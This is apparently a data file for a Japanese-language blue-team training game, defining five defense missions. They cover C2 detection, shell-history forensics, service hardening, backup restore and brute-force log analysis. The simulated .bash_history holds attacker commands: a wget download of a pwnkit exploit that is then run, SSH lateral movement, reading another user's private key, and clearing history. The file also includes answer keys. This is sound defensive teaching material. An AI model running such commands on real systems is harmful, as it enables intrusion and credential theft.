// 防御・監視・運用（ブルーチーム）
export const stageDefense = {
  id: 'defense',
  title: 'Defense — 守る・監視する',
  subtitle: 'プロセス/接続監視・履歴解析・堅牢化・バックアップで被害を防ぐ',
  intro: '攻撃を知る者は、守り方も知る。検知・封じ込め・復旧・予防——守る側の実務を、これまでの知識を総動員して行う。',
  missions: [
    {
      id: 'd-01-conn',
      title: '不審な外向き接続を見つける',
      minutes: 11,
      objectives: ['確立済み接続を調べる', 'C2通信らしき外部接続を特定する'],
      prereq: [],
      briefing: 'このサーバーが外部の見知らぬアドレスへ継続的に接続している。マルウェアのC2通信かもしれない。確立済み(ESTAB)の接続を洗い、不審な相手を特定する。',
      concepts: [{
        title: '接続状態の監視(ss/netstat)',
        why: '待ち受け(LISTEN)だけでなく、実際に確立している通信(ESTAB)を見ると、マルウェアの外向き通信(C2)を発見できる。',
        problem: 'サーバーが「どこと通信しているか」を把握し、正規でない宛先を見つけたい。',
        how: 'ss -tnp で全TCP接続(数値表示・プロセス付き)。State が ESTAB の行は確立済み接続。Peer Address が外部の見慣れないIP/高ポートで、怪しいプロセスが張っていればC2の疑い。',
        example: '$ ss -tnp\ntcp ESTAB 10.10.14.7:49888 45.77.x.x:4444 users:(("beacon"...))',
        relation: 'ss で確立済み接続を調べ、C2接続とプロセスを特定する。',
      }],
      env: {
        hostname: 'srv-09', user: 'analyst', sudo: true,
        processes: [{ pid: 7100, user: 'analyst', cmd: '/tmp/.sys/beacon', cpu: 1.1 }],
        network: { self: '10.10.14.7', dns: {}, listening: [
          { proto: 'tcp', addr: '0.0.0.0', port: 22, state: 'LISTEN', process: 'sshd', pid: 801 },
          { proto: 'tcp', addr: '10.10.14.7', port: 49888, state: 'ESTAB', peer: '45.77.102.9:4444', process: 'beacon', pid: 7100 },
          { proto: 'tcp', addr: '10.10.14.7', port: 51020, state: 'ESTAB', peer: '10.10.14.1:443', process: 'apt', pid: 7201 },
        ] },
      },
      quick: ['ss -tnp', 'ss -tlnp', 'ps aux', 'kill 7100'],
      tasks: [
        {
          q: 'ss で確立済み(ESTAB)のTCP接続を調べます。外部の 45.77.102.9 へ接続しているプロセス名を答えてください。',
          narration: 'ss -tnp で全TCP接続とプロセスが見える。State ESTAB の行の Peer Address と Process に注目。',
          check: { type: 'answer', any: ['beacon'], ci: true },
          answerHint: 'プロセス名',
          hints: ['ss -tnp を実行', 'Peer が 45.77.102.9:4444 の ESTAB 行', 'beacon プロセスが外部4444へ接続＝C2の疑い'],
          explain: '/tmp/.sys/beacon が外部45.77.102.9の4444番へ確立接続＝典型的なC2(コマンド&コントロール)通信。4444は攻撃ツールの定番ポート。もう一方の 10.10.14.1:443 は内部ゲートウェイへのapt(正規)。ESTAB接続の監視は外向きマルウェア通信の検知に有効。',
        },
        {
          q: 'そのC2ビーコンのプロセス(PID 7100)を停止してください。停止できたら done。',
          narration: '特定したら即封じ込め。kill でプロセスを止める(Stage2の復習)。',
          check: { type: 'process', absent: 'beacon' },
          answerHint: '停止したら done',
          hints: ['ps aux で PID を確認(7100)', 'kill 7100', 'ps aux で消えたか確認し done'],
          explain: 'kill 7100 でC2ビーコンを停止、外部通信を遮断した。実対応では併せて、接続先IP(45.77.102.9)をファイアウォールで遮断し、永続化(cron/サービス)を調べ(Stage3)、/tmp/.sys を証拠保全して削除する。検知→封じ込め→根絶の流れ。',
        },
      ],
      review: { steps: ['ss -tnp で確立接続を確認', '外部の不審なPeerを特定', 'プロセスを特定し停止', '接続先を遮断・根絶'], commands: [{ cmd: 'ss -tnp', meaning: '確立済みTCP接続とプロセス' }, { cmd: 'kill 7100', meaning: 'C2プロセスを停止' }], why: '外向き接続の監視は、侵入後のマルウェア活動(C2通信・情報持ち出し)の検知に直結する。', practice: 'ss/netstatによる定期的な接続監視、EDRでの外向き通信検知、IoC(接続先IP)の遮断。', related: ['C2', 'プロセス管理', 'ファイアウォール'] },
      learned: ['established-connections', 'c2-detection', 'ss-tnp', 'containment'], solution: ['ss -tnp', 'kill 7100'],
    },

    {
      id: 'd-02-history',
      title: 'コマンド履歴から行動を追う',
      minutes: 11,
      objectives: ['bash_history を解析する', '攻撃者の操作手順を再構成する'],
      prereq: ['d-01-conn'],
      briefing: '侵害されたアカウントのシェル履歴(.bash_history)が残っていた。攻撃者が「何をしたか」が時系列で刻まれている。読み解いて被害範囲を把握する。',
      concepts: [{
        title: 'シェル履歴の調査',
        why: '.bash_history には実行コマンドが順に記録される。攻撃者が消し忘れれば、行動の完全な記録になる。',
        problem: '乗っ取られたアカウントで、攻撃者が何をダウンロードし、どこへ横移動しようとしたかを知りたい。',
        how: '~/.bash_history を cat/grep で読む。ダウンロード(wget/curl)、権限昇格(sudo)、横移動(ssh)、情報収集(cat /etc/passwd)などの痕跡を追う。grep で特定操作を抽出。',
        example: '$ cat ~/.bash_history\n$ grep -E "wget|curl|ssh" ~/.bash_history',
        relation: 'bash_history を解析し、ダウンロードした不正ツールと次の標的を特定する。',
      }],
      env: {
        hostname: 'srv-09', user: 'analyst',
        files: [{ path: '/home/analyst/.bash_history', owner: 'analyst', content: `ls -la
whoami
cat /etc/passwd
sudo -l
wget http://45.77.102.9/tools/pwnkit -O /tmp/.sys/pwnkit
chmod +x /tmp/.sys/pwnkit
/tmp/.sys/pwnkit
id
ssh backup@10.10.14.40
cat /home/backup/.ssh/id_rsa
history -c
` }],
      },
      quick: ['cat ~/.bash_history', 'grep -E "wget|curl" ~/.bash_history', 'grep ssh ~/.bash_history', 'wc -l ~/.bash_history'],
      tasks: [
        {
          q: '攻撃者が wget で外部からダウンロードした権限昇格ツールのファイル名を、.bash_history から特定して答えてください。',
          narration: 'まず履歴全体を cat で読む。wget/curl の行がダウンロード操作。何を落としたかを見る。',
          check: { type: 'answer', any: ['pwnkit', '/tmp/.sys/pwnkit'], ci: true },
          answerHint: 'ファイル名',
          hints: ['grep wget ~/.bash_history', 'wget http://.../pwnkit -O /tmp/.sys/pwnkit', 'pwnkit(権限昇格エクスプロイト)'],
          explain: '攻撃者は外部C2(45.77.102.9)から pwnkit(PwnKit=CVE-2021-4034等の権限昇格エクスプロイト)をDLし実行した。履歴から「情報収集(cat passwd, sudo -l)→DL→昇格→横移動(ssh)」という攻撃連鎖が読み取れる。history -c で消そうとした形跡も。',
        },
        {
          q: '攻撃者が次に横移動(lateral movement)を試みた先のホストのIPアドレスを、履歴の ssh コマンドから特定して答えてください。',
          narration: 'ssh の行が横移動の痕跡。どのホストへ繋ごうとしたかを読む。',
          check: { type: 'answer', any: ['10.10.14.40'], normalizeIp: true },
          answerHint: '接続先IP',
          hints: ['grep ssh ~/.bash_history', 'ssh backup@10.10.14.40', '10.10.14.40 へ横移動を試みた'],
          explain: 'ssh backup@10.10.14.40 で別ホスト(db.lab)へ横移動を試み、さらに backup の秘密鍵(id_rsa)を盗んでいる。被害は1台に留まらない。bash_history から攻撃の全経路が復元でき、10.10.14.40 の調査と backup アカウントの鍵失効が次の対応になる。',
        },
      ],
      review: { steps: ['~/.bash_history を読む', 'wget/curl でDL物を特定', 'ssh で横移動先を特定', '被害範囲を拡大調査'], commands: [{ cmd: 'cat ~/.bash_history', meaning: 'コマンド履歴を読む' }, { cmd: 'grep -E "wget|ssh" ~/.bash_history', meaning: 'DL/横移動を抽出' }], why: 'シェル履歴は攻撃者の行動の一次記録。被害範囲(横移動先・持ち出し)の把握に不可欠。', practice: '侵害調査での .bash_history/.zsh_history 解析、history の監査ログ化(auditd)。', related: ['権限昇格', '横移動', 'ログ解析'] },
      learned: ['bash-history', 'lateral-movement', 'attack-chain', 'pwnkit'], solution: ['cat /home/analyst/.bash_history', 'grep ssh /home/analyst/.bash_history'],
    },

    {
      id: 'd-03-harden',
      title: '不要サービスを止めて堅牢化',
      minutes: 10,
      objectives: ['攻撃面を減らす', '不要サービスを停止・無効化する'],
      prereq: ['d-01-conn'],
      briefing: 'このサーバーには使っていないサービス(telnet, FTP)が動いており、攻撃面になっている。不要なものを止め、自動起動も切って堅牢化する。',
      concepts: [{
        title: 'サービスの堅牢化(アタックサーフェス削減)',
        why: '動いているサービスはすべて攻撃対象。使わないものを止めれば、攻撃面(入口)を根本的に減らせる。',
        problem: 'telnet(平文)やFTP(平文)など、安全でない/不要なサービスが公開されている。',
        how: 'systemctl list-units でサービス一覧、status で状態確認。不要なものは systemctl stop で停止、disable で自動起動を無効化。最小限のサービスだけ動かすのが堅牢化の基本(最小権限/最小機能)。',
        example: '$ sudo systemctl stop telnet\n$ sudo systemctl disable telnet',
        relation: 'telnet を停止・無効化して攻撃面を減らす。',
      }],
      env: {
        hostname: 'srv-09', user: 'analyst', sudo: true,
        services: [
          { name: 'sshd', desc: 'OpenSSH server', active: true, enabled: true },
          { name: 'telnet', desc: 'telnet (insecure, plaintext)', active: true, enabled: true },
          { name: 'vsftpd', desc: 'FTP server', active: true, enabled: true },
          { name: 'nginx', desc: 'web server', active: true, enabled: true },
        ],
      },
      quick: ['systemctl status telnet', 'sudo systemctl stop telnet', 'sudo systemctl disable telnet', 'systemctl list-units'],
      tasks: [
        {
          q: '平文で通信し盗聴に弱い、今や使うべきでないリモートログインサービスが動いています。そのサービス名を答えてください（SSHの古い代替）。',
          narration: 'systemctl list-units でサービスを眺める。暗号化されない危険なリモートアクセス手段に注目。',
          check: { type: 'answer', any: ['telnet'], ci: true },
          hints: ['systemctl list-units でサービス一覧', 'SSH以前の平文リモートログイン', 'telnet(通信が暗号化されず危険)'],
          explain: 'telnet は通信が平文で、認証情報が盗聴される。SSHに完全に置き換えられるべき過去の遺物。FTPも平文で同様。こうした不要・危険なサービスの洗い出しが堅牢化の第一歩。',
        },
        {
          q: 'その telnet サービスを停止し、再起動後も起動しないよう自動起動を無効化してください。両方できたら done。',
          narration: 'stop で今すぐ止め、disable で自動起動も切る(両方やらないと再起動で復活)。システム変更なので sudo。',
          check: { type: 'all', of: [{ type: 'service', name: 'telnet', active: false }, { type: 'service', name: 'telnet', enabled: false }] },
          noInput: true,
          hints: ['sudo systemctl stop telnet', 'sudo systemctl disable telnet', 'systemctl status telnet で inactive/disabled を確認し done'],
          explain: 'stop(即時停止)と disable(自動起動無効)の両方で、telnet を恒久的に無効化できた。攻撃面を1つ減らした。堅牢化の原則は「最小機能」——必要なサービスだけを動かす。同様にFTPも止め、必要ならSFTP等の安全な代替に移行する。',
        },
      ],
      review: { steps: ['サービス一覧を確認', '不要/危険なサービスを特定', 'stop で停止', 'disable で自動起動無効化'], commands: [{ cmd: 'sudo systemctl stop telnet', meaning: 'サービス停止' }, { cmd: 'sudo systemctl disable telnet', meaning: '自動起動を無効化' }], why: '攻撃面の削減は最も費用対効果の高い防御。動かさないサービスは攻撃されない。', practice: 'サーバー構築時の不要サービス停止、定期的な稼働サービスの棚卸し、CIS Benchmark準拠。', related: ['最小権限', 'ポート管理', 'プロセス管理'] },
      learned: ['hardening', 'attack-surface', 'systemctl-disable', 'insecure-services'], solution: ['sudo systemctl stop telnet', 'sudo systemctl disable telnet'],
    },

    {
      id: 'd-04-backup',
      title: 'バックアップと復旧',
      minutes: 10,
      objectives: ['重要データをバックアップする', '改ざん前の状態と比較して復旧する'],
      prereq: ['d-03-harden'],
      briefing: 'ランサムウェアや改ざんに備える最後の砦がバックアップ。設定ファイルが改ざんされた想定で、バックアップから正しい状態を確認し、復旧する。',
      concepts: [{
        title: 'バックアップと復旧',
        why: 'どんな防御も破られうる。正しい状態のコピーがあれば、改ざん・破壊・ランサムから復旧できる。可用性(A)と完全性(I)を守る最後の砦。',
        problem: '改ざんされた設定を、既知の正しい状態へ戻したい。そのために事前のバックアップが要る。',
        how: 'cp で重要ファイルを複製して保全(タイムスタンプや .bak 名で)。改ざん時はバックアップと比較(diff的にcat比較/ハッシュ比較)し、cp で上書き復旧。3-2-1ルール(3コピー・2媒体・1オフサイト)が原則。',
        example: '$ cp /etc/app.conf /backup/app.conf.good   # 事前保全\n$ cp /backup/app.conf.good /etc/app.conf  # 復旧',
        relation: '正しいバックアップから改ざんされた設定を復旧する。',
      }],
      env: {
        hostname: 'srv-09', user: 'analyst', sudo: true, dirs: ['/backup', '/etc/app'],
        files: [
          { path: '/etc/app/app.conf', owner: 'root', mode: 0o644, content: 'admin_user=acme_admin\nallow_remote=true\nbind=0.0.0.0\n# tampered: backdoor enabled\nbackdoor=on\n' },
          { path: '/backup/app.conf.good', owner: 'root', mode: 0o644, content: 'admin_user=acme_admin\nallow_remote=false\nbind=127.0.0.1\n' },
        ],
      },
      quick: ['cat /etc/app/app.conf', 'cat /backup/app.conf.good', 'sudo cp /backup/app.conf.good /etc/app/app.conf', 'cat /etc/app/app.conf'],
      tasks: [
        {
          q: '現在の /etc/app/app.conf と、正しいバックアップ /backup/app.conf.good を見比べます。改ざんで追加された、裏口を有効にする設定行のキー(=の左側)を答えてください。',
          narration: '2つのファイルを cat で見比べる。バックアップには無く、現行にだけある危険な行を探す。',
          check: { type: 'answer', any: ['backdoor'], ci: true },
          answerHint: '設定キー名',
          hints: ['cat /etc/app/app.conf と cat /backup/app.conf.good を比較', 'バックアップに無い行を探す', 'backdoor=on が追加されている'],
          explain: '現行にだけ backdoor=on があり、allow_remote も true、bind も 0.0.0.0 に改ざんされていた。正しいバックアップとの比較で、何が変えられたかが一目瞭然。事前にバックアップ(既知の正常状態)があることが、改ざん検知と復旧の前提になる。',
        },
        {
          q: '改ざんされた /etc/app/app.conf を、正しいバックアップで上書きして復旧してください。復旧できたら done。',
          narration: 'cp でバックアップを現行へ上書きする。root所有ファイルなので sudo が要る。',
          check: { type: 'all', of: [{ type: 'state', path: '/etc/app/app.conf', notContains: 'backdoor' }, { type: 'state', path: '/etc/app/app.conf', contains: 'allow_remote=false' }] },
          noInput: true,
          hints: ['sudo cp /backup/app.conf.good /etc/app/app.conf', 'バックアップ→本番へ上書き', 'cat /etc/app/app.conf で backdoor が消えたか確認し done'],
          explain: 'sudo cp でバックアップから復旧し、backdoor行が消え allow_remote=false に戻った。改ざんからの復旧完了。実運用ではバックアップ自体の改ざん防止(読み取り専用/オフサイト保管)と、復旧後の侵入経路の封鎖が重要。3-2-1ルールでバックアップを多重化する。',
        },
      ],
      review: { steps: ['バックアップと現行を比較', '改ざん箇所を特定', 'cp でバックアップから復旧', '侵入経路も封鎖'], commands: [{ cmd: 'cat /backup/app.conf.good', meaning: '正しい状態を確認' }, { cmd: 'sudo cp /backup/app.conf.good /etc/app/app.conf', meaning: 'バックアップから復旧' }], why: 'バックアップは可用性と完全性を守る最後の砦。改ざん・破壊・ランサムからの復旧を可能にする。', practice: '設定の変更前バックアップ、3-2-1ルール、バックアップからのリストア訓練、など。', related: ['完全性', '改ざん検知', 'インシデント復旧'] },
      learned: ['backup', 'restore', '3-2-1-rule', 'recovery'], solution: ['cat /etc/app/app.conf', 'cat /backup/app.conf.good', 'sudo cp /backup/app.conf.good /etc/app/app.conf'],
    },

    {
      id: 'd-05-bruteforce-defense',
      title: 'ブルートフォースを検知して防ぐ',
      minutes: 11,
      objectives: ['総当たり攻撃を集計で検知する', '遮断すべきIPを特定する'],
      prereq: ['d-02-history'],
      briefing: 'SSHへの総当たり攻撃が続いている。認証ログを集計して攻撃元を特定し、遮断リストを作る。検知の定量化が防御の第一歩だ。',
      concepts: [{
        title: 'ブルートフォース検知と遮断',
        why: '総当たり攻撃は「同一IPからの大量の認証失敗」として現れる。集計で定量化すれば自動遮断の閾値を決められる。',
        problem: 'どのIPが、何回失敗しているかをランキングし、遮断対象を決めたい。',
        how: 'auth.log から "Failed password" を抽出し、発信元IP(awk で該当列)を sort | uniq -c | sort -rn で集計。閾値(例:10回以上)を超えるIPを遮断リスト(fail2banやファイアウォール)に登録する。',
        example: '$ grep "Failed password" auth.log | awk \'{print $NF}\' | sort | uniq -c | sort -rn',
        relation: '認証ログを集計し、最多の攻撃元IPを特定する。',
      }],
      env: {
        hostname: 'srv-09', user: 'analyst',
        files: [{ path: '/var/log/auth.log', owner: 'analyst', content:
`Oct 14 03:00:01 sshd[1]: Failed password for root from 185.22.3.7
Oct 14 03:00:02 sshd[2]: Failed password for root from 185.22.3.7
Oct 14 03:00:03 sshd[3]: Failed password for admin from 185.22.3.7
Oct 14 03:00:04 sshd[4]: Failed password for root from 185.22.3.7
Oct 14 03:00:05 sshd[5]: Failed password for test from 91.6.8.44
Oct 14 03:00:06 sshd[6]: Failed password for root from 185.22.3.7
Oct 14 03:00:07 sshd[7]: Failed password for root from 91.6.8.44
Oct 14 03:00:08 sshd[8]: Accepted password for deploy from 10.10.14.20
Oct 14 03:00:09 sshd[9]: Failed password for root from 185.22.3.7
` }],
      },
      quick: ['cd /var/log', 'grep "Failed password" auth.log', 'grep "Failed password" auth.log | awk \'{print $NF}\' | sort | uniq -c | sort -rn', 'grep Accepted auth.log'],
      tasks: [
        {
          q: '認証失敗(Failed password)のログから発信元IPを集計し、最も多く失敗している攻撃元IPを答えてください。',
          narration: '"Failed password" の行を抽出し、末尾のIP($NF=最終列)を集計パイプで数える。最多が主要な攻撃元。',
          check: { type: 'answer', any: ['185.22.3.7'], normalizeIp: true },
          answerHint: '最多のIP',
          hints: ['grep "Failed password" auth.log | awk \'{print $NF}\' | sort | uniq -c | sort -rn', '$NF は行の最終列(IP)', '185.22.3.7 が最多'],
          explain: '185.22.3.7 が6回失敗で最多＝主要な総当たり攻撃元。awk の $NF(最終フィールド)でIPを抜き、集計パイプで定量化した。この数値を根拠に、閾値超過のIPを fail2ban やファイアウォールで自動遮断する。検知の定量化が自動防御の土台。',
        },
        {
          q: '総当たりに紛れて、1件だけ認証に「成功」したログイン(Accepted)があります。そのアカウント名を答えてください（正規か要確認の対象）。',
          narration: '失敗の山だけでなく成功も確認する。grep Accepted で成功ログインを抽出し、正規かどうか要確認の対象を洗い出す。',
          check: { type: 'answer', any: ['deploy'], ci: true },
          hints: ['grep Accepted auth.log', 'Accepted password for ___ from ...', 'deploy アカウントが成功(10.10.14.20から)'],
          explain: 'deploy が 10.10.14.20(内部)から成功。発信元が内部IPで総当たり元とは別なので正規の可能性が高いが、インシデント中は全成功ログインを「要確認」として洗う。攻撃の最中に成功があれば突破を疑う(Stage3の教訓)。検知は失敗と成功の両面から。',
        },
      ],
      review: { steps: ['Failed passwordを抽出', 'awk $NF でIPを抜く', 'sort|uniq -c|sort -rn で集計', '閾値超過IPを遮断・成功も確認'], commands: [{ cmd: 'grep "Failed password" auth.log | awk \'{print $NF}\' | sort | uniq -c | sort -rn', meaning: '攻撃元IPのランキング' }, { cmd: 'grep Accepted auth.log', meaning: '成功ログインの確認' }], why: '総当たりの検知と定量化は、自動遮断(fail2ban)や鍵認証強制といった防御策の根拠になる。', practice: 'auth.log監視、fail2ban運用、SSH鍵認証強制、ログイン試行のアラート、など。', related: ['ログ解析', 'SSH堅牢化', 'fail2ban'] },
      learned: ['bruteforce-defense', 'log-aggregation', 'awk-nf', 'fail2ban'], solution: ['cd /var/log', 'grep "Failed password" auth.log | awk \'{print $NF}\' | sort | uniq -c | sort -rn', 'grep Accepted auth.log'],
    },
  ],
};
